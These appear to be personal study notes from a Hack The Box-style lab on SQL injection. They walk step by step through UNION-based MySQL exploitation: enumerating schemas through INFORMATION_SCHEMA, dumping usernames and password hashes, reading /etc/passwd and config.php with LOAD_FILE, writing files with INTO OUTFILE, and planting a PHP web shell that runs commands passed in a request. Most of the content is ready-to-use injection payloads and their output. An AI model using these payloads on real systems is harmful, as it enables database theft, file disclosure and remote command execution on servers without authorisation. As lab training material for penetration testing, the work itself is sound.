# ðŸ’‡ Exploitation

## Database Enumeration

If we see in HTTP responses that the webserver is running `Apache` or `Nginx`, it is a good guess that the webserver is running on Linux, so the DBMS is likely `MySQL` and if the webserver is `IIS`, so it is likely to be `MSSQL`.

To form nice queries to dump the database, we can utilize the `INFORMATION_SCHEMA` Database. It contains metadata about the databases and tables present on the server.

If we only specify a table's name for a `SELECT` statement, it will look for tables within the same database.

So to reference a table present in another DB, we can use the dot â€˜`.`â€™ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

```sql
SELECT * FROM my_database.users;
```

The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server.

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Now we could use this with our union command

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

We can find the current database with the `SELECT database()` query.

```sql
cn' UNION select 1,database(),2,3-- -
```

The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) table contains information about all tables throughout the database.. The `TABLE_NAME` column stores table names, while the `TABLE_SCHEMA` column points to the database each table belongs to. So we can use the following payload to find the tables within the `dev` database:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases. The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns can be used.

Let's say we have the credentials table:

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

And now we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev` database.

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

_**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**_

```
'UNION SELECT 1,2,3,4 FROM users-- -
```

<figure><img src="../../../.gitbook/assets/image (1282).png" alt=""><figcaption></figcaption></figure>

```
'UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES-- -
```

<figure><img src="../../../.gitbook/assets/image (1283).png" alt=""><figcaption></figcaption></figure>

```
'UNION SELECT 1,COLUMN_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.COLUMNS-- -l
```

<figure><img src="../../../.gitbook/assets/image (1284).png" alt=""><figcaption></figcaption></figure>

```
'UNION SELECT 1,username,password,4 FROM users-- -
```

<figure><img src="../../../.gitbook/assets/image (1285).png" alt=""><figcaption></figcaption></figure>

## Reading Files

in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files.

So we need to start by enumerating user privileges

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

So the union command would look like&#x20;

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
#or
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

<figure><img src="../../../.gitbook/assets/image (1286).png" alt=""><figcaption></figcaption></figure>

So now we see that we are root, we need to check if we have super admin priv:

```sql
SELECT super_priv FROM mysql.user
# sor the query will be 
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
# or if we target a user:
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

It will return Y or N

We can also dump other privileges we have directly from the schema, with the following query:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
#And the query will turn out like:
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

<figure><img src="../../../.gitbook/assets/image (1287).png" alt=""><figcaption></figcaption></figure>

So if we are super admin we can say that we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

<figure><img src="../../../.gitbook/assets/image (1288).png" alt=""><figcaption></figcaption></figure>

_**We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**_

```
' union select 1,CURRENT_USER(),3,4-- -
```

<figure><img src="../../../.gitbook/assets/image (1289).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

<figure><img src="../../../.gitbook/assets/image (1290).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

<figure><img src="../../../.gitbook/assets/image (1291).png" alt=""><figcaption></figcaption></figure>

## Writing Files

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

The [secure\_file\_priv](https://mariadb.com/kb/en/server-system-variables/#secure\_file\_priv) variable is used to determine where to read/write files from.

MariaDB has this variable set to empty by default but `MySQL` uses `/var/lib/mysql-files` as the default folder.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

If we are using a `UNION` injection, we have to get the value using a `SELECT` statement so `MySQL` global variables are stored in a table called [global\_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
#so it will turn out like:
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

<figure><img src="../../../.gitbook/assets/image (1292).png" alt=""><figcaption><p>No data = read/write files to any location</p></figcaption></figure>

The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files.

we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified.

```shell-session
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```shell-session
ElFelixi0@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell-session
ElFelixi0@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

An injection command would look something like this:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

<figure><img src="../../../.gitbook/assets/image (1293).png" alt=""><figcaption></figcaption></figure>

### Writing a Web Shell

We can write the following PHP webshell to be able to execute commands directly on the back-end server:

```php
<?php system($_REQUEST[0]); ?>
# so the request would give out:
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

and to access the file:

```
http://SERVER_IP:PORT/shell.php?0=id
```

<figure><img src="../../../.gitbook/assets/image (1294).png" alt=""><figcaption></figcaption></figure>
